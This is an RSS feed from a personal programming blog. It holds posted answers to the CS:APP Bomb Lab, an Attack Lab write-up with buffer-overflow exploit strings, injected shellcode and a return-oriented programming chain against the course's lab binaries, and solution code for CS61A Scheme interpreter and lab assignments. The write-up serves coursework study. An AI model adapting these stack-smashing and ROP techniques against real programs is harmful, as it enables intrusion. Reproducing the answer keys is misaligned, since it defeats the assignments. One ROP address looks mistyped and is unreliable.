<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Lizi</title><link>https://LianSeKong.github.io/lizi</link><description>即是代码也是生活！</description><copyright>Lizi</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://img.icons8.com/doodle/480/mugman.png</url><title>avatar</title><link>https://LianSeKong.github.io/lizi</link></image><lastBuildDate>Fri, 06 Sep 2024 09:17:07 +0000</lastBuildDate><managingEditor>Lizi</managingEditor><ttl>60</ttl><webMaster>Lizi</webMaster><item><title>Bomb Lab</title><link>https://LianSeKong.github.io/lizi/post/Bomb%20Lab.html</link><description>&gt; 完成 1-6. 隐藏炸弹关卡未完成&#13;
&#13;
&gt; 思路pending....&#13;
&#13;
## answer&#13;
Border relations with Canada have never been better.&#13;
1 2 4 8 16 32&#13;
7 327&#13;
0 0 DrEvil&#13;
ionefg&#13;
4 3 2 1 6 5。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/Bomb%20Lab.html</guid><pubDate>Fri, 06 Sep 2024 09:16:39 +0000</pubDate></item><item><title>Attack Lab</title><link>https://LianSeKong.github.io/lizi/post/Attack%20Lab.html</link><description># Attack Lab&#13;
&#13;
&gt; 🥝 第三章：程序的机器级表示&#13;
&#13;
## Part I: Code Injection Attacks&#13;
&#13;
🌼 第一部分没有栈随机化和栈only-read限制&#13;
&#13;
🍌 需要输入字符，字符是实际注入代码的位表示&#13;
&#13;
🍎 在进行执行时加上`-qi` ， 跳过联网，进行本地执行&#13;
&#13;
&#13;
&#13;
## touch1&#13;
&#13;
&gt; 在getbuf函数调用后，执行touch1函数，而不是返回test&#13;
&#13;
1. getbuf读入字符时， 没对长度做限制，意味着可以读入超过bufSize的字符&#13;
&#13;
2. 将test函数call getbuf函数时在栈上压入的ret地址改为touch1函数的地址（0x4017c0）&#13;
&#13;
3. 位表示 `bit1`&#13;
&#13;
   ```text&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   c0 17 40 00 00 00 00 00&#13;
   ```&#13;
&#13;
4. 通过hex2raw将bit转化为字符  `./hex2raw &lt; bit1 &gt; str1` &#13;
&#13;
5.  执行  `./ctarget -qi str1`&#13;
&#13;
## touch2&#13;
&#13;
&gt; 相对于touch1， 需要传递给touch2参数， 参数为cookie的值&#13;
&#13;
1.  🍈需要注入代码，让cookie值传递给%rdi寄存器&#13;
&#13;
2.  🍀inject code `touch2_inject_code.s`&#13;
&#13;
   ```assembly&#13;
   movq $0x59b997fa, %rdi # 传递cookie&#13;
   pushq $0x4017ec        # 入栈touch2函数的返回地址 &#13;
   ret					   # 执行touch2	&#13;
   ```&#13;
&#13;
3. 🍂 编译inject code，并且查看对应的bit表示 &#13;
&#13;
   ```&#13;
   gcc -c touch2_inject_code.s&#13;
   objdum -d touch2_inject_code.o&#13;
   ```&#13;
&#13;
   ```&#13;
   # 编译后表示为&#13;
   &#13;
   0000000000000000 &lt;.text&gt;:&#13;
      0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi&#13;
      7:   68 ec 17 40 00          push   $0x4017ec&#13;
      c:   c3                      ret &#13;
   ```&#13;
&#13;
4.  🍃将test函数的返回地址改为inject code的地址&#13;
&#13;
5.  🌿inject code的地址为进入getbuf后分配栈空间后的位置 （0x5561dc78）&#13;
&#13;
6.  🏵️ 位表示 `bit2`&#13;
&#13;
   ```&#13;
   48 c7 c7 fa 97 b9 59 68  # inject code &#13;
   ec 17 40 00 c3 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   78 dc 61 55 00 00 00 00 # inject code rsp position&#13;
   &#13;
   ```&#13;
&#13;
7. 将位表示转化为字符 `./hex2raw &lt; bit2 &gt; str2` &#13;
&#13;
8. 执行  `./ctarget -qi str2`&#13;
&#13;
&#13;
## touch3&#13;
&#13;
1.  🍈 相对于touch2，传递参数为字符指针，指向cookie存放的位置&#13;
&#13;
2.  避免hexmatch函数的调用栈覆盖cookie数组的数据&#13;
&#13;
3.  字符数组存放在ret的+8位置（执行完touch3后直接退出程序，不会影响其他）&#13;
&#13;
4.  inject code &#13;
&#13;
   ```assembly&#13;
   movq $0x5561dca8, %rdi # 字符数组位置，相当于touch2的栈顶位置加去0x30&#13;
   push $0x4018fa   # touch3函数位置&#13;
   ret &#13;
   ```&#13;
&#13;
5. 🏵️ 位表示 `bit3`&#13;
&#13;
   ```&#13;
   48 c7 c7 a8 dc 61 55 68&#13;
   fa 18 40 00 c3 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   00 00 00 00 00 00 00 00&#13;
   78 dc 61 55 00 00 00 00&#13;
   35 39 62 39 39 37 66 61&#13;
   ```&#13;
&#13;
6. 将位表示转化为字符 `./hex2raw &lt; bit3 &gt; str3` &#13;
&#13;
7. 执行  `./ctarget -qi str3`&#13;
&#13;
&#13;
&#13;
## Part II: Return-Oriented Programming&#13;
&#13;
&gt; 🌿 具有栈随机化和栈只读限制&#13;
&gt;&#13;
&gt; ☘️ 只能通过程序已有代码来进行代码攻击&#13;
&gt;&#13;
&gt; 🍀 不断ret跳转执行代码片段&#13;
&#13;
### touch2&#13;
&#13;
&gt; 和partⅠ中touch2实现的效果一样&#13;
&#13;
&#13;
&#13;
 1. 🍉test的ret地址改为第一段gadget代码地址&#13;
&#13;
 2. 🍊test的ret地址+8位置为 cookie的值&#13;
&#13;
 3. 🍋test的ret地址+16位置为第二段gadget代码的值&#13;
&#13;
 4. 🍌test的ret地址+24位置为touch2函数的地址&#13;
&#13;
 5. 🍍gadget代码，根据已有代码可以灵活实现&#13;
&#13;
    ```assembly&#13;
    popq %rax  &#13;
    ret&#13;
    &#13;
    movq %rax %rdi&#13;
    ret&#13;
    ```&#13;
&#13;
 6. 🍎找出gadget代码位置&#13;
&#13;
    ```assembly&#13;
    # bit表示 58 c3&#13;
    popq %rax  &#13;
    ret&#13;
    # bit表示  48 89 c7 c3&#13;
    movq %rax %rdi&#13;
    ret&#13;
    ```&#13;
&#13;
 7. 🍏位表示&#13;
&#13;
    ```&#13;
    39 39 39 39 39 39 39 39&#13;
    39 39 39 39 39 39 39 39&#13;
    39 39 39 39 39 39 39 39&#13;
    39 39 39 39 39 39 39 39&#13;
    39 39 39 39 39 39 39 39&#13;
    cc 19 40 00 00 00 00 00 # 第一段gadget&#13;
    fa 97 b9 59 00 00 00 00 # cookie&#13;
    cc 19 10 00 00 00 00 00 # 第二段gadget&#13;
    ec 17 40 00 00 00 00 00 # touch2&#13;
    ```&#13;
&#13;
 8. 🍐将位表示转化为字符 `./hex2raw &lt; bit4 &gt; str4` &#13;
&#13;
9. 🍓执行  `./rtarget -qi str4`&#13;
&#13;
### touch3&#13;
&#13;
&gt; 暂无精力，有机会再来&#13;
&#13;
------&#13;
&#13;
&#13;
&#13;
第一版本，完成于2024/04/06, 缺少每个touch的栈图表示。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/Attack%20Lab.html</guid><pubDate>Fri, 06 Sep 2024 09:15:15 +0000</pubDate></item><item><title>Scheme Interpreter Project</title><link>https://LianSeKong.github.io/lizi/post/Scheme%20Interpreter%20Project.html</link><description># Scheme Interpreter &#13;
&#13;
&#13;
&#13;
&gt; CS61A  Project4 Summer 2024&#13;
&#13;
&#13;
&#13;
## Problem 1 &#13;
&#13;
&gt; Frame类是用于存储当前执行环境中绑定的变量，每个Frame实例具有一个存储变量的字典和父Frame&#13;
&#13;
1. define函数用于存储一个symbol和对应的值&#13;
2. lookup用于寻找Frame中的symbol对应的值（frame链作为一个链表结构，首元素为全局Frame）&#13;
&#13;
&#13;
&#13;
```python&#13;
def define(self, symbol, value):&#13;
    '''Define Scheme SYMBOL to have VALUE.'''&#13;
    # BEGIN PROBLEM 1&#13;
    self.bindings[symbol] = value&#13;
    # END PROBLEM 1&#13;
&#13;
def lookup(self, symbol):&#13;
    '''Return the value bound to SYMBOL. Errors if SYMBOL is not found.'''&#13;
    # BEGIN PROBLEM 1&#13;
    env = self&#13;
    while env is not None:&#13;
        if symbol in env.bindings.keys():&#13;
            return env.bindings[symbol]&#13;
        env = env.parent&#13;
    # END PROBLEM 1&#13;
    raise SchemeError('unknown identifier: {0}'.format(symbol))&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 2&#13;
&#13;
&gt; scheme中存在内置BuiltinProcedure和LambdaProcedure，MuProcedure三种进程&#13;
&#13;
首先实现内置进程的处理&#13;
&#13;
```python&#13;
 if isinstance(procedure, BuiltinProcedure):&#13;
        # BEGIN PROBLEM 2&#13;
        py_args = []&#13;
        while args is not nil:&#13;
            py_args.append(args.first)&#13;
            args = args.rest&#13;
        if procedure.need_env:&#13;
            py_args.append(env)&#13;
        # END PROBLEM 2&#13;
        try:&#13;
            # BEGIN PROBLEM 2      &#13;
            return procedure.py_func(*py_args)&#13;
&#13;
            # END PROBLEM 2&#13;
        except TypeError as err:&#13;
            raise SchemeError('incorrect number of arguments: {0}'.format(procedure))&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 3 &#13;
&#13;
&gt;eval一个scheme表达式&#13;
&#13;
Scheme表达式具有三种形式&#13;
&#13;
1.  2&#13;
2. (+ 2 3 4 5 6)&#13;
3. a&#13;
4. (+ (sub expression) (sub expression))&#13;
&#13;
既可以是一个可计算的数字、bool和symbol&#13;
&#13;
也可以是一个可调用的程序&#13;
&#13;
可调用的程序也可以包含可计算的字面量也可以是表达式或者symbol&#13;
&#13;
```python&#13;
def scheme_eval(expr, env, _=None): # Optional third argument is ignored&#13;
    '''Evaluate Scheme expression EXPR in Frame ENV.&#13;
&#13;
    &gt;&gt;&gt; expr = read_line('(+ 2 2)')&#13;
    &gt;&gt;&gt; expr&#13;
    Pair('+', Pair(2, Pair(2, nil)))&#13;
    &gt;&gt;&gt; scheme_eval(expr, create_global_frame())&#13;
    4&#13;
    '''&#13;
    # Evaluate atoms&#13;
    if scheme_symbolp(expr):    # 处理定义的symbol&#13;
        return env.lookup(expr)&#13;
    elif self_evaluating(expr): # 处理数字和布尔值&#13;
        return expr&#13;
&#13;
    # All non-atomic expressions are lists (combinations)&#13;
    if not scheme_listp(expr):  # 处理非法表达式格式&#13;
        raise SchemeError('malformed list: {0}'.format(repl_str(expr)))&#13;
    first, rest = expr.first, expr.rest  &#13;
    # 处理特殊的格式&#13;
    if scheme_symbolp(first) and first in scheme_forms.SPECIAL_FORMS:&#13;
        return scheme_forms.SPECIAL_FORMS[first](rest, env)&#13;
    else:&#13;
        # BEGIN PROBLEM 3&#13;
        if (isinstance(first, Pair)): #处理类似((if #t - +) 2 1)的情况 &#13;
            first = scheme_eval(first, env)&#13;
        elif not isinstance(first, BuiltinProcedure): #处理非内置程序&#13;
            first = env.lookup(first)&#13;
      	# 先执行 operand expression &#13;
        rest = rest.map(lambda first: scheme_eval(first, env))&#13;
        # 等待 operand expression执行过后，再执行&#13;
        return scheme_apply(first, rest, env)&#13;
&#13;
        # END PROBLEM 3&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 4&#13;
&#13;
&gt; 处理(define x subexpression)情况&#13;
&#13;
```python&#13;
    if scheme_symbolp(signature):&#13;
        # assigning a name to a value e.g. (define x (+ 1 2))&#13;
        validate_form(expressions, 2, 2) &#13;
        # BEGIN PROBLEM 4&#13;
        env.define(signature, scheme_eval(expressions.rest.first, env))&#13;
        return signature&#13;
        # END PROBLEM 4&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 5&#13;
&#13;
&gt; 直接返回quote后面的表达式即可，无需计算&#13;
&#13;
```python&#13;
def do_quote_form(expressions, env):&#13;
    '''Evaluate a quote form.&#13;
&#13;
    &gt;&gt;&gt; env = create_global_frame()&#13;
    &gt;&gt;&gt; do_quote_form(read_line('((+ x 2))'), env) # evaluating (quote (+ x 2))&#13;
    Pair('+', Pair('x', Pair(2, nil)))&#13;
    '''&#13;
    validate_form(expressions, 1, 1)&#13;
    # BEGIN PROBLEM 5&#13;
    return expressions.first&#13;
    # END PROBLEM 5&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 6&#13;
&#13;
&#13;
&#13;
&gt;处理类似于begin这种语句， 计算所有子表达式，返回最后一个表达式的值&#13;
&#13;
```python&#13;
def eval_all(expressions, env):&#13;
    '''Evaluate each expression in the Scheme list EXPRESSIONS in&#13;
    Frame ENV (the current environment) and return the value of the last.&#13;
&#13;
    &gt;&gt;&gt; eval_all(read_line('(1)'), create_global_frame())&#13;
    1&#13;
    &gt;&gt;&gt; eval_all(read_line('(1 2)'), create_global_frame())&#13;
    2&#13;
    &gt;&gt;&gt; x = eval_all(read_line('((print 1) 2)'), create_global_frame())&#13;
    1&#13;
    &gt;&gt;&gt; x&#13;
    2&#13;
    &gt;&gt;&gt; eval_all(read_line('((define x 2) x)'), create_global_frame())&#13;
    2&#13;
    '''&#13;
    # BEGIN PROBLEM 6&#13;
    &#13;
    while not expressions is nil:&#13;
        val = scheme_eval(expressions.first, env)&#13;
        expressions = expressions.rest&#13;
        if expressions is nil:&#13;
            return val&#13;
    # END PROBLEM 6&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 7 &#13;
&#13;
&gt; 根据内置定义，去创建一个lambda程序的实例&#13;
&#13;
&#13;
&#13;
```python&#13;
def do_lambda_form(expressions, env):&#13;
    '''Evaluate a lambda form.&#13;
&#13;
    &gt;&gt;&gt; env = create_global_frame()&#13;
    &gt;&gt;&gt; do_lambda_form(read_line('((x) (+ x 2))'), env) # evaluating (lambda (x) (+ x 2))&#13;
    LambdaProcedure(Pair('x', nil), Pair(Pair('+', Pair('x', Pair(2, nil))), nil), &lt;Global Frame&gt;)&#13;
    '''&#13;
    validate_form(expressions, 2)&#13;
    formals = expressions.first&#13;
    validate_formals(formals)&#13;
    # BEGIN PROBLEM 7&#13;
    body = expressions.rest&#13;
    return LambdaProcedure(formals, body, env)&#13;
&#13;
    # END PROBLEM 7&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 8&#13;
&#13;
&gt; lambda程序的执行会创建一个局部的frame，根据参数symbol和参数值在局部的frame的bindings中建立映射&#13;
&#13;
&#13;
&#13;
```python&#13;
def make_child_frame(self, formals, vals):&#13;
    '''Return a new local frame whose parent is SELF, in which the symbols&#13;
    in a Scheme list of formal parameters FORMALS are bound to the Scheme&#13;
    values in the Scheme list VALS. Both FORMALS and VALS are represented&#13;
    as Pairs. Raise an error if too many or too few vals are given.&#13;
&#13;
    &gt;&gt;&gt; env = create_global_frame()&#13;
    &gt;&gt;&gt; formals, expressions = read_line('(a b c)'), read_line('(1 2 3)')&#13;
    &gt;&gt;&gt; env.make_child_frame(formals, expressions)&#13;
    &lt;{a: 1, b: 2, c: 3} -&gt; &lt;Global Frame&gt;&gt;&#13;
    '''&#13;
    if len(formals) != len(vals):&#13;
        raise SchemeError('Incorrect number of arguments to function call')&#13;
    # BEGIN PROBLEM 8&#13;
    frame = Frame(self)&#13;
    while not formals is nil:&#13;
        val = vals.first&#13;
        key = formals.first&#13;
        frame.define(key, val)&#13;
        formals = formals.rest&#13;
        vals = vals.rest&#13;
    return frame&#13;
&#13;
    # END PROBLEM 8&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 9 &#13;
&#13;
&#13;
&#13;
&gt;执行一个lambda程序，首先创建一个局部frame，然后执行lambda的body里的全部表达式&#13;
&gt;&#13;
&gt;此时调用eval_all而不是scheme_eval的原因是: lambda程序的body中会具有多个子表达式，lambda会逐个执行，返回最后一个表达式执行后的结果&#13;
&#13;
&#13;
&#13;
```python&#13;
elif isinstance(procedure, LambdaProcedure):&#13;
    # BEGIN PROBLEM 9&#13;
    frame = procedure.env.make_child_frame(procedure.formals, args)&#13;
    return eval_all(procedure.body, frame)&#13;
    # END PROBLEM 9&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 10&#13;
&#13;
&gt;之前实现的define定义symbol的情况，现在来处理定义一个procedure的情况 &#13;
&gt;&#13;
&gt;1. 首次提取procedure的symbol、arguments和body&#13;
&gt;2. 验证arguments是否符合规则&#13;
&gt;3. 创建一个lambda表达式&#13;
&gt;4. 向frame的bindings中建立映射&#13;
&#13;
```python&#13;
    elif isinstance(signature, Pair) and scheme_symbolp(signature.first):&#13;
        # defining a named procedure e.g. (define (f x y) (+ x y))&#13;
        # BEGIN PROBLEM 10&#13;
        symbol = signature.first&#13;
        formals = signature.rest&#13;
        body = expressions.rest&#13;
&#13;
        validate_formals(formals)&#13;
&#13;
        val = LambdaProcedure(formals, body, env)&#13;
        env.define(symbol, val)&#13;
        return symbol&#13;
        # END PROBLEM 10&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 11&#13;
&#13;
&gt;do_mu_form： 执行时的父frame不取决于定义procedure的的frame，而取决于执行时的frame&#13;
&#13;
&#13;
&#13;
```python&#13;
def do_mu_form(expressions, env):&#13;
    '''Evaluate a mu form.'''&#13;
    validate_form(expressions, 2)&#13;
    formals = expressions.first&#13;
    validate_formals(formals)&#13;
    # BEGIN PROBLEM 11&#13;
    body = expressions.rest&#13;
    return MuProcedure(formals, body)&#13;
    # END PROBLEM 11&#13;
```&#13;
&#13;
&#13;
&#13;
执行mu程序时，根据当前的frame去创建局部frame&#13;
&#13;
```python&#13;
    elif isinstance(procedure, MuProcedure):&#13;
        # BEGIN PROBLEM 11&#13;
        frame = env.make_child_frame(procedure.formals, args)&#13;
        return eval_all(procedure.body, frame)&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## Problem 12&#13;
&#13;
&gt; 处理and和if，规则在项目开始文件中已经描述的很清楚了&#13;
&#13;
&#13;
&#13;
```python&#13;
def do_and_form(expressions, env):&#13;
    '''Evaluate a (short-circuited) and form.&#13;
&#13;
    &gt;&gt;&gt; env = create_global_frame()&#13;
    &gt;&gt;&gt; do_and_form(read_line('(#f (print 1))'), env) # evaluating (and #f (print 1))&#13;
    False&#13;
    &gt;&gt;&gt; # evaluating (and (print 1) (print 2) (print 4) 3 #f)&#13;
    &gt;&gt;&gt; do_and_form(read_line('((print 1) (print 2) (print 3) (print 4) 3 #f)'), env)&#13;
    1&#13;
    2&#13;
    3&#13;
    4&#13;
    False&#13;
    '''&#13;
    # BEGIN PROBLEM 12&#13;
    while not expressions is nil:&#13;
        val = scheme_eval(expressions.first, env)&#13;
        if is_scheme_false(val):&#13;
            return False&#13;
        if expressions.rest is nil:&#13;
            return val&#13;
        expressions = expressions.rest&#13;
    return True&#13;
    # END PROBLEM 12&#13;
&#13;
def do_or_form(expressions, env):&#13;
    '''Evaluate a (short-circuited) or form.&#13;
&#13;
    &gt;&gt;&gt; env = create_global_frame()&#13;
    &gt;&gt;&gt; do_or_form(read_line('(10 (print 1))'), env) # evaluating (or 10 (print 1))&#13;
    10&#13;
    &gt;&gt;&gt; do_or_form(read_line('(#f 2 3 #t #f)'), env) # evaluating (or #f 2 3 #t #f)&#13;
    2&#13;
    &gt;&gt;&gt; # evaluating (or (begin (print 1) #f) (begin (print 2) #f) 6 (begin (print 3) 7))&#13;
    &gt;&gt;&gt; do_or_form(read_line('((begin (print 1) #f) (begin (print 2) #f) 6 (begin (print 3) 7))'), env)&#13;
    1&#13;
    2&#13;
    6&#13;
    '''&#13;
    # BEGIN PROBLEM 12&#13;
    while not expressions is nil:&#13;
        val = scheme_eval(expressions.first, env)&#13;
        if is_scheme_true(val):&#13;
            return val&#13;
        expressions = expressions.rest&#13;
    return False&#13;
    # END PROBLEM 12&#13;
```&#13;
&#13;
&#13;
&#13;
## Problem 13 &#13;
&#13;
&gt; do_cond_form:  具有多个子表达式（包含else）,如果是else则直接返回表达式执行的结果。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/Scheme%20Interpreter%20Project.html</guid><pubDate>Wed, 04 Sep 2024 03:09:02 +0000</pubDate></item><item><title>cs61a-su24-labs</title><link>https://LianSeKong.github.io/lizi/post/cs61a-su24-labs.html</link><description># Cs61a Summer2024 Labs&#13;
&#13;
&#13;
&#13;
## 1.  lab01&#13;
&#13;
```python&#13;
def falling(n, k):&#13;
    '''Compute the falling factorial of n to depth k.&#13;
&#13;
    &gt;&gt;&gt; falling(6, 3)  # 6 * 5 * 4&#13;
    120&#13;
    &gt;&gt;&gt; falling(4, 3)  # 4 * 3 * 2&#13;
    24&#13;
    &gt;&gt;&gt; falling(4, 1)  # 4&#13;
    4&#13;
    &gt;&gt;&gt; falling(4, 0)&#13;
    1&#13;
    '''&#13;
    i, count = 0, 1&#13;
    while i &lt; k:&#13;
        count *= n - i&#13;
        i += 1&#13;
    return count&#13;
&#13;
def divisible_by_k(n, k):&#13;
    '''&#13;
    &gt;&gt;&gt; a = divisible_by_k(10, 2)  # 2, 4, 6, 8, and 10 are divisible by 2&#13;
    2&#13;
    4&#13;
    6&#13;
    8&#13;
    10&#13;
    &gt;&gt;&gt; a&#13;
    5&#13;
    &gt;&gt;&gt; b = divisible_by_k(3, 1)  # 1, 2, and 3 are divisible by 1&#13;
    1&#13;
    2&#13;
    3&#13;
    &gt;&gt;&gt; b&#13;
    3&#13;
    &gt;&gt;&gt; c = divisible_by_k(6, 7)  # There are no integers up to 6 divisible by 7&#13;
    &gt;&gt;&gt; c&#13;
    0&#13;
    '''&#13;
    i, count = 1, 0&#13;
    while i &lt;= n:&#13;
        if i % k == 0:&#13;
            count += 1&#13;
            print(i)&#13;
        i += 1&#13;
    return count&#13;
&#13;
def sum_digits(y):&#13;
    '''Sum all the digits of y.&#13;
&#13;
    &gt;&gt;&gt; sum_digits(10) # 1 + 0 = 1&#13;
    1&#13;
    &gt;&gt;&gt; sum_digits(4224) # 4 + 2 + 2 + 4 = 12&#13;
    12&#13;
    &gt;&gt;&gt; sum_digits(1234567890)&#13;
    45&#13;
    &gt;&gt;&gt; a = sum_digits(123) # make sure that you are using return rather than print&#13;
    &gt;&gt;&gt; a&#13;
    6&#13;
    '''&#13;
    total = 0&#13;
    while y &gt; 0:&#13;
        total += y % 10&#13;
        y //= 10&#13;
    return total&#13;
&#13;
def double_eights(n):&#13;
    '''Return true if n has two eights in a row.&#13;
    &gt;&gt;&gt; double_eights(8)&#13;
    False&#13;
    &gt;&gt;&gt; double_eights(88)&#13;
    True&#13;
    &gt;&gt;&gt; double_eights(2882)&#13;
    True&#13;
    &gt;&gt;&gt; double_eights(880088)&#13;
    True&#13;
    &gt;&gt;&gt; double_eights(12345)&#13;
    False&#13;
    &gt;&gt;&gt; double_eights(80808080)&#13;
    False&#13;
    '''&#13;
    while n &gt; 10:&#13;
        curr = n % 10&#13;
        prev = n // 10 % 10&#13;
        if prev == curr and prev == 8:&#13;
            return True&#13;
        n //= 10&#13;
    return False&#13;
```&#13;
&#13;
&#13;
&#13;
## lab02&#13;
&#13;
```python&#13;
&#13;
def composite_identity(f, g):&#13;
    '''&#13;
    Return a function with one parameter x that returns True if f(g(x)) is&#13;
    equal to g(f(x)). You can assume the result of g(x) is a valid input for f&#13;
    and vice versa.&#13;
&#13;
    &gt;&gt;&gt; add_one = lambda x: x + 1        # adds one to x&#13;
    &gt;&gt;&gt; square = lambda x: x**2          # squares x [returns x^2]&#13;
    &gt;&gt;&gt; b1 = composite_identity(square, add_one)&#13;
    &gt;&gt;&gt; b1(0)                            # (0 + 1) ** 2 == 0 ** 2 + 1&#13;
    True&#13;
    &gt;&gt;&gt; b1(4)                            # (4 + 1) ** 2 != 4 ** 2 + 1&#13;
    False&#13;
    '''&#13;
    def helper(x):&#13;
        return f(g(x)) == g(f(x))&#13;
    return helper&#13;
&#13;
def sum_digits(y):&#13;
    '''Return the sum of the digits of non-negative integer y.'''&#13;
    total = 0&#13;
    while y &gt; 0:&#13;
        total, y = total + y % 10, y // 10&#13;
    return total&#13;
&#13;
def is_prime(n):&#13;
    '''Return whether positive integer n is prime.'''&#13;
    if n == 1:&#13;
        return False&#13;
    k = 2&#13;
    while k &lt; n:&#13;
        if n % k == 0:&#13;
            return False&#13;
        k += 1&#13;
    return True&#13;
&#13;
def count_cond(condition):&#13;
    '''Returns a function with one parameter N that counts all the numbers from&#13;
    1 to N that satisfy the two-argument predicate function Condition, where&#13;
    the first argument for Condition is N and the second argument is the&#13;
    number from 1 to N.&#13;
&#13;
    &gt;&gt;&gt; count_fives = count_cond(lambda n, i: sum_digits(n * i) == 5)&#13;
    &gt;&gt;&gt; count_fives(10)   # 50 (10 * 5)&#13;
    1&#13;
    &gt;&gt;&gt; count_fives(50)   # 50 (50 * 1), 500 (50 * 10), 1400 (50 * 28), 2300 (50 * 46)&#13;
    4&#13;
&#13;
    &gt;&gt;&gt; is_i_prime = lambda n, i: is_prime(i) # need to pass 2-argument function into count_cond&#13;
    &gt;&gt;&gt; count_primes = count_cond(is_i_prime)&#13;
    &gt;&gt;&gt; count_primes(2)    # 2&#13;
    1&#13;
    &gt;&gt;&gt; count_primes(3)    # 2, 3&#13;
    2&#13;
    &gt;&gt;&gt; count_primes(4)    # 2, 3&#13;
    2&#13;
    &gt;&gt;&gt; count_primes(5)    # 2, 3, 5&#13;
    3&#13;
    &gt;&gt;&gt; count_primes(20)   # 2, 3, 5, 7, 11, 13, 17, 19&#13;
    8&#13;
    '''&#13;
    def helper(n):&#13;
        i, count = 1, 0&#13;
        while i &lt;= n:&#13;
            if condition(n, i):&#13;
                count += 1&#13;
            i += 1&#13;
        return count&#13;
    return helper&#13;
&#13;
def multiple(a, b):&#13;
    '''Return the smallest number n that is a multiple of both a and b.&#13;
&#13;
    &gt;&gt;&gt; multiple(3, 4)&#13;
    12&#13;
    &gt;&gt;&gt; multiple(14, 21)&#13;
    42&#13;
    &gt;&gt;&gt; multiple(4, 8)&#13;
    8&#13;
    &gt;&gt;&gt; multiple(3, 9)&#13;
    9&#13;
    '''&#13;
    i = 1&#13;
    max_factory = 1&#13;
    while i &lt;= min(a, b) and max_factory:&#13;
        if a % i == 0 and b % i == 0:&#13;
            max_factory = i&#13;
        i += 1&#13;
&#13;
    return a * b // max_factory&#13;
    &#13;
&#13;
&#13;
&#13;
def cycle(f1, f2, f3):&#13;
    '''Returns a function that is itself a higher-order function.&#13;
&#13;
    &gt;&gt;&gt; def add1(x):&#13;
    ...     return x + 1&#13;
    &gt;&gt;&gt; def times2(x):&#13;
    ...     return x * 2&#13;
    &gt;&gt;&gt; def add3(x):&#13;
    ...     return x + 3&#13;
    &gt;&gt;&gt; my_cycle = cycle(add1, times2, add3)&#13;
    &gt;&gt;&gt; identity = my_cycle(0)&#13;
    &gt;&gt;&gt; identity(5)&#13;
    5&#13;
    &gt;&gt;&gt; add_one_then_double = my_cycle(2)&#13;
    &gt;&gt;&gt; add_one_then_double(1)&#13;
    4&#13;
    &gt;&gt;&gt; do_all_functions = my_cycle(3)&#13;
    &gt;&gt;&gt; do_all_functions(2)&#13;
    9&#13;
    &gt;&gt;&gt; do_more_than_a_cycle = my_cycle(4)&#13;
    &gt;&gt;&gt; do_more_than_a_cycle(2)&#13;
    10&#13;
    &gt;&gt;&gt; do_two_cycles = my_cycle(6)&#13;
    &gt;&gt;&gt; do_two_cycles(1)&#13;
    19&#13;
    '''&#13;
&#13;
    def helper(n):&#13;
        def inner_helper(x):&#13;
            if n == 0:&#13;
                return x&#13;
            i = 1&#13;
            result = x&#13;
            while i &lt;= n:&#13;
                if i % 3 == 1:&#13;
                    result = f1(result)&#13;
                elif i % 3 == 2:&#13;
                    result = f2(result)&#13;
                else:&#13;
                    result = f3(result)&#13;
                i += 1&#13;
            return result&#13;
        return inner_helper&#13;
    return helper&#13;
```&#13;
&#13;
&#13;
&#13;
## lab03&#13;
&#13;
```python&#13;
&#13;
LAB_SOURCE_FILE=__file__&#13;
&#13;
&#13;
def double_eights(n):&#13;
    ''' Returns whether or not n has two digits in row that&#13;
    are the number 8. Assume n has at least two digits in it.&#13;
&#13;
    &gt;&gt;&gt; double_eights(1288)&#13;
    True&#13;
    &gt;&gt;&gt; double_eights(880)&#13;
    True&#13;
    &gt;&gt;&gt; double_eights(538835)&#13;
    True&#13;
    &gt;&gt;&gt; double_eights(284682)&#13;
    False&#13;
    &gt;&gt;&gt; double_eights(588138)&#13;
    True&#13;
    &gt;&gt;&gt; double_eights(78)&#13;
    False&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; # ban iteration&#13;
    &gt;&gt;&gt; check(LAB_SOURCE_FILE, 'double_eights', ['While', 'For'])&#13;
    True&#13;
    '''&#13;
    last, second_last = n % 10, n // 10 % 10&#13;
    if last == 8 and second_last == 8:&#13;
        return True&#13;
    elif n &lt; 100:&#13;
        return False&#13;
    return double_eights(n // 10)&#13;
&#13;
&#13;
def make_onion(f, g):&#13;
    '''Return a function can_reach(x, y, limit) that returns&#13;
    whether some call expression containing only f, g, and x with&#13;
    up to limit calls will give the result y.&#13;
&#13;
    &gt;&gt;&gt; up = lambda x: x + 1&#13;
    &gt;&gt;&gt; double = lambda y: y * 2&#13;
    &gt;&gt;&gt; can_reach = make_onion(up, double)&#13;
    &gt;&gt;&gt; can_reach(5, 25, 4)      # 25 = up(double(double(up(5))))&#13;
    True&#13;
    &gt;&gt;&gt; can_reach(5, 25, 3)      # Not possible&#13;
    False&#13;
    &gt;&gt;&gt; can_reach(1, 1, 0)      # 1 = 1&#13;
    True&#13;
    &gt;&gt;&gt; add_ing = lambda x: x + 'ing'&#13;
    &gt;&gt;&gt; add_end = lambda y: y + 'end'&#13;
